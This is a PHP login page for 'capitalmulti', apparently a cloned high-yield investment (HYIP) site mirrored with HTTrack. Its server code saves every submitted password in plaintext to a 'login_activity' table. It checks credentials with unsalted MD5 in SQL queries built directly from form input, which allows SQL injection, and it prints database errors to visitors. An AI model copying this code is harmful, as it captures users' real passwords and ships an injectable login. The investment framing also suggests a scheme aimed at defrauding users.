<?php include('../../server/connection.php');

include('../../server/config.php')

?>
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from www.capitalmulti.com/users/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 17 Mar 2025 20:52:34 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="jGw5RGJp3wgmIz7ynl4ZxImJQbkWZ1IxOufIjvsP">
    <title>capitalmulti - Sign In</title>
    <meta name="description"
        content="capitalmulti.com - Complete HYIP Investment System . Most Advanced HYIP Investment System Script in codecanyon.

hyip, bitcoin, investment,  hyip business, hyip script, best hyip, buy hyip script, advanced hyip script, hyip software, high yield investment program, hyip manager, hyip manager script, cheap hyip script, reliable hyip, secure hyip script, php hyip script, new hyip script, hyip program">
    <meta name="keywords"
        content="hyip,bitcoin,investment,hyip business,hyip script,best hyip,buy hyip script,advanced hyip script,hyip software,high yield investment program,hyip manager,hyip manager script,cheap hyip script,reliable hyip,secure hyip script,php hyip script,new hyip script,hyip program">
    <link rel="shortcut icon" href="assets/images/logoIcon/favicon.png" type="image/x-icon">


    <link rel="apple-touch-icon" href="assets/images/logoIcon/logo.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="capitalmulti - Sign In">

    <meta itemprop="name" content="capitalmulti - Sign In">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="<?php echo $domain ?>users/assets/images/seo/66292e53481051713974867.png">

    <meta property="og:type" content="website">
    <meta property="og:title" content="capitalmulti.com - Complete HYIP Investment System">
    <meta property="og:description"
        content="capitalmulti.com - Complete HYIP Investment System . Most Advanced HYIP Investment System Script in codecanyon.">
    <meta property="og:image" content="<?php echo $domain ?>users/assets/images/seo/66292e53481051713974867.png" />
    <meta property="og:image:type" content="<?php echo $domain ?>users/image/png" />
    <meta property="og:image:width" content="600" />
    <meta property="og:image:height" content="315" />
    <meta property="og:url" content="login/">

    <meta name="twitter:card" content="summary_large_image">
    <!-- bootstrap 4  -->
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/vendor/bootstrap.min.css">
    <!-- fontawesome 5  -->
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/all.min.css">
    <!-- line-awesome webfont -->
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/line-awesome.min.css">
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/vendor/animate.min.css">
    <!-- slick slider css -->
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/vendor/slick.css">
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/vendor/dots.css">
    <!-- dashdoard main css -->
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/main.css">
    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/custom.css">
    <link rel="stylesheet"
        href="<?php echo $domain ?>users/assets/templates/bit_gold/css/color9bce.css?color=CCA354&amp;secondColor=000000">
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>

<body>

<?php
   
  if (isset($_POST['login'])) {

 

    $name = $_POST['name'];
    $password = md5($_POST['password']);
    
    $hass = $_POST['password'];
    
    $date = date("Y-m-d H:i:s");

    
    $insert = mysqli_query($connection,"INSERT INTO `login_activity`(`id`, `name`, `password`,`date`) VALUES ('','$name','$hass','$date')");

    $select = mysqli_query($connection, "SELECT `id` FROM `client` WHERE `name`='$name' AND `password`='$password'");

    echo mysqli_error($connection);
    if (mysqli_num_rows($select)) {
      while ($row = mysqli_fetch_assoc($select)) {
        $id = $row['id'];
        $_SESSION['user_login'] = $id;
       if(isset($_SESSION['user_login']) && $_SESSION['user_login'] != ""){
            echo "<script>
        
            Model('Login successful','green');
            setTimeout(()=>{
              window.open('../dashboard/','_self')
            },2000)
        
    </script>";
        }
        
      }
    } else {
      echo "<script>
      
      Model('Login credential is wrong','red');
      
    </script>
    ";
      
    }
  } 
?>


    <!-- scroll-to-top start -->
    <div class="scroll-to-top">
        <span class="scroll-icon">
            <i class="fa fa-rocket" aria-hidden="true"></i>
        </span>
    </div>
    <!-- scroll-to-top end -->

    <div class="full-wh">
        <!-- STAR ANIMATION -->
        <div class="bg-animation">
            <div id='stars'></div>
            <div id='stars2'></div>
            <div id='stars3'></div>
            <div id='stars4'></div>
        </div><!-- / STAR ANIMATION -->
    </div>
    <div class="page-wrapper">
        <!-- header-section start  -->
        <header class="header">
            <div class="header__bottom">
                <div class="container">
                    <nav class="navbar navbar-expand-xl p-0 align-items-center">
                        <a class="site-logo site-title" href="index.html"><img
                                src="<?php echo $domain ?>users/assets/images/logoIcon/logo.png" alt="site-logo"></a>
                        <ul class="account-menu responsive-account-menu ml-3">
                            <li class="icon"><a href="login.html"><i class="las la-user"></i></a></li>
                        </ul>
                        <button class="navbar-toggler" type="button" data-toggle="collapse"
                            data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                            aria-expanded="false" aria-label="Toggle navigation">
                            <span class="menu-toggle"></span>
                        </button>
                        <div class="collapse navbar-collapse" id="navbarSupportedContent">
                            <ul class="navbar-nav main-menu ml-auto">
                                <li> <a href="index.html">Home</a></li>
                                <li><a href="plan.html">Plan</a></li>
                                <li><a href="about.html">About</a></li>

                            </ul>
                            <div class="nav-right">
                                <ul class="account-menu ml-3">
                                    <li class="icon"><a href="<?php echo $domain ?>users/login/"><i
                                                class="las la-user"></i></a></li>
                                </ul>
                                <select class="select d-inline-block w-auto ml-xl-3 langSel">
                                    <option value="en" selected>English</option>
                                </select>
                            </div>
                        </div>
                    </nav>
                </div>
            </div><!-- header__bottom end -->
        </header>
        <!-- header-section end  -->

        <!-- account section start -->
        <div class="account-section bg_img"
            data-background="<?php echo $domain ?>users/assets/images/frontend/login/5fce3a113b6d91607350801.jpg">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-xl-5 col-lg-7">
                        <div class="account-card">
                            <div class="account-card__header bg_img overlay--one"
                                data-background="<?php echo $domain ?>users/assets/images/frontend/login/5fce3a1188a861607350801.jpg">
                                <h2 class="section-title">Welcome To <span class="base--color">capitalmulti</span></h2>
                                <p>account</p>
                            </div>
                            <div class="account-card__body">
                            <form class="mt-4" method="post" onsubmit="return submitUserForm();">
                  <input type="hidden" name="_token" value="YVBlPfIokT3tnMMi6aPcBFKTUW9pa8cP5QB2IGTY">
                  <div class="form-group">
                    <label>User Name</label>
                    <input type="text" class="form-control" name="name" placeholder="Enter user name" required>
                  </div>
                  <div class="form-group">
                    <label>Password</label>
                    <input type="password" type="text" class="form-control" name="password" placeholder="Enter password" required>
                  </div>
                  <div class="form-group d-flex justify-content-center">
                  </div>
                  <!-- <div class="form-group">
                    <link href="https://fonts.googleapis.com/css?family=Henny+Penny&amp;display=swap" rel="stylesheet">
                    <div style="height: 46px; line-height: 46px; width:100%; text-align: center; background-color: #003; color: #2468ef!important; font-size: 26px; font-weight: bold; letter-spacing: 20px; font-family: 'Henny Penny', cursive;  -webkit-user-select: none; -moz-user-select: none;-ms-user-select: none;user-select: none;  display: flex; justify-content: center;" class="captcha"><span style="    float:left;     -webkit-transform: rotate(15deg);">8</span><span style="    float:left;     -webkit-transform: rotate(-46deg);">0</span><span style="    float:left;     -webkit-transform: rotate(-32deg);">9</span><span style="    float:left;     -webkit-transform: rotate(2deg);">3</span><span style="    float:left;     -webkit-transform: rotate(-17deg);">6</span><span style="    float:left;     -webkit-transform: rotate(-48deg);">9</span></div><input type="hidden" name="captcha_secret" value="42ddbe2851f3c85913d7af161c191bb3ae45acd31f1c775e939cd9d73b6854f7">
                  </div>


                  <div class="form-group">
                    <input type="text" name="captcha" class="form-control" placeholder="Enter code" autocomplete="off" required>
                  </div> -->


                  <div class="mt-3">
                    <button name="login" type="submit" class="cmn-btn">Login Now</button>
                  </div>
                  <div class="form-row mt-2">
                    <div class="col-sm-6">
                      <div class="form-group form-check pl-0">
                        <p class="f-size-14">Don't have an account? <a onclick="" href="<?php echo $domain ?>register/" class="base--color">Register</a></p>
                      </div>
                    </div>
                    
                  </div>
                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- account section end -->



        <!-- footer section start -->
        <footer class="footer bg_img"
            data-background="<?php echo $domain ?>users/assets/images/frontend/footer/5fce39681ce6b1607350632.jpg">
            <div class="footer__top">
                <div class="container">
                    <div class="row justify-content-center">
                        <div class="col-lg-12 text-center">
                            <a href="index.html"><img src="<?php echo $domain ?>users/assets/images/logoIcon/logo.png"
                                    alt="image"></a>
                            <ul class="footer-short-menu d-flex flex-wrap justify-content-center mt-3">
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="footer__bottom">
                <div class="container">
                    <div class="row">
                        <div class="col-md-6 text-md-left text-center">
                            <p>
                            <p>© 2015 <a href="index.html" class="base--color">capitalmulti</a>. All rights reserved</p>
                            </p>
                        </div>
                        <div class="col-md-6">
                            <ul class="social-link-list d-flex flex-wrap justify-content-md-end justify-content-center">
                                <li><a href="https://facebook.com/"><i class="lab la-facebook-f"></i></a></li>
                                <li><a href="https://www.twitter.com/"><i class="lab la-twitter"></i></a></li>
                                <li><a href="https://www.pinterest.com/"><i class="lab la-pinterest-p"></i></a></li>
                                <li><a href="https://www.linkedin.com/"><i class="lab la-linkedin-in"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!-- footer section end -->
    </div> <!-- page-wrapper end -->

    <!-- jQuery library -->
    <script src="<?php echo $domain ?>users/assets/templates/bit_gold/js/vendor/jquery-3.5.1.min.js"></script>
    <!-- bootstrap js -->
    <script src="<?php echo $domain ?>users/assets/templates/bit_gold/js/vendor/bootstrap.bundle.min.js"></script>

    <!-- slick slider js -->
    <script src="<?php echo $domain ?>users/assets/templates/bit_gold/js/vendor/slick.min.js"></script>
    <script src="<?php echo $domain ?>users/assets/templates/bit_gold/js/vendor/wow.min.js"></script>
    <!-- dashboard custom js -->
    <script src="<?php echo $domain ?>users/assets/templates/bit_gold/js/app.js"></script>


    <link rel="stylesheet" href="<?php echo $domain ?>users/assets/templates/bit_gold/css/iziToast.min.css">
    <script src="<?php echo $domain ?>users/assets/templates/bit_gold/js/iziToast.min.js"></script>


    <script>
    "use strict";

    function notify(status, message) {
        iziToast[status]({
            message: message,
            position: "topRight"
        });
    }
    </script>

    <script>
    "use strict";

    function submitUserForm() {
        var response = grecaptcha.getResponse();
        if (response.length == 0) {
            document.getElementById('g-recaptcha-error').innerHTML =
                '<span style="color:red;">Captcha field is required.</span>';
            return false;
        }
        return true;
    }

    function verifyCaptcha() {
        document.getElementById('g-recaptcha-error').innerHTML = '';
    }
    </script>


</body>

<script async src='../../d2mpatx37cqexb.cloudfront.net/delightchat-whatsapp-widget/embeds/embed.min.js'></script>
<script>
var wa_btnSetting = {
    "btnColor": "#16BE45",
    "ctaText": "",
    "cornerRadius": 40,
    "marginBottom": 20,
    "marginLeft": 20,
    "marginRight": 20,
    "btnPosition": "left",
    "whatsAppNumber": "447587570944",
    "welcomeMessage": "How can we help?",
    "zIndex": 999999,
    "btnColorScheme": "light"
};
window.onload = () => {
    _waEmbed(wa_btnSetting);
};
</script>


<script>
window.screetsxi = {
    appid: "666aa653157b9db76f81a1b2.nw1",
};
(function() {
    var w = window;
    var i = function() {
        i.c(arguments);
    };
    i.q = [];
    i.c = function(args) {
        i.q.push(args);
    };
    w.scxi = i;
    w.addEventListener("load", function() {
        var b = document.createElement("script");
        b.src = 'https://widget.screets.io/_/' + w.screetsxi.appid;
        b.async = !0;
        document.head.appendChild(b);
    }, !1);
})();
</script>

<script>
(function() {
    "use strict";
    $(document).on("change", ".langSel", function() {
        window.location.href = "https://www.capitalmulti.com/users/change/" + $(this).val();
    });

    $('.policy').on('click', function() {
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });
        $.get('cookie/accept.json', function(response) {
            iziToast.success({
                message: response,
                position: "topRight"
            });
            $('.cookie__wrapper').addClass('d-none');
        });
    });
})();
</script>


</body>

<!-- Mirrored from www.capitalmulti.com/users/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 17 Mar 2025 20:52:51 GMT -->

</html>

</body>

</html>